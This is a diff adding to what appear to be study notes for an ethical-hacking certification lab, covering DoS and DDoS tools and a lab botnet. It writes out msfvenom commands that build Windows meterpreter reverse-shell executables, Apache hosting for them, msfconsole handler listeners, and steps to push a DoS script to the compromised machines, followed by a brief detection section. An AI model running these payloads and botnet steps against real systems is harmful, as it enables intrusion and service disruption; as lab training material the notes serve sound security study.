@@ -1318,6 +1318,62 @@ and send it to victim by sending the host ip
 ```
 </details>
 
+# Perform DoS and DDoS Attacks using Various Techniques
+<summary>Perform a DDoS Attack using ISB and UltraDDOS-v2</summary>
 
+* ISB (I am so bored)
+```console
+:~$open and install ISB exe from ceh tools and give the credentials
+```
+
+> same open on the other system and open UltraDDOS-v2 add credential here
+```console 
+:~$and proceed to victim machine and open resmon(resource monitor)
+check cpu usage
+```
+*  Perform a DDoS Attack using Botnet
+```console
+:~$ in parrot
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe
+and same cmd to create 2 more payload by changing port number
+create a folder
+
+Run mkdir /var/www/html/share command to create a shared folder
+Run chmod -R 755 /var/www/html/share/ command
+Run chown -R www-data:www-data /var/www/html/share/ command
+
+cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
+service apache2 start 
+
+Launch three new terminals
+
+msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
+same command in all 3 terminal by changing port numbers
+
+and then
+http://10.10.1.13/share << in victim machine and download and click
+Similarly, download exploit2.exe on Windows Server 2019, and exploit3.exe on Windows Server 2022 and run it.
+
+Now, we will upload the DDoS script to our botnets
+
+upload /home/attacker/Downloads/eagle-dos.py
+for all 3 terminal shell cmd
+shell (cmd to get in shell)
+
+then to see the impact go to ubuntu and hit wireshark afterwords
+show application and navigate to system monitor and observe the memory usage
+```
+</details>
+<details>
+<summary>Detect and protect against DDoS attacks using Anti DDoS Guardian</summary>
+
+```console
+:~$ open anti ddos guardian tool in defender system and 
+perform ddos attack with low ion cannon
+and also in another system use UDP and thread option and Ip and attack the defend system
+
+in guardian you can block the ip from the option
+```
+</details>
 
 
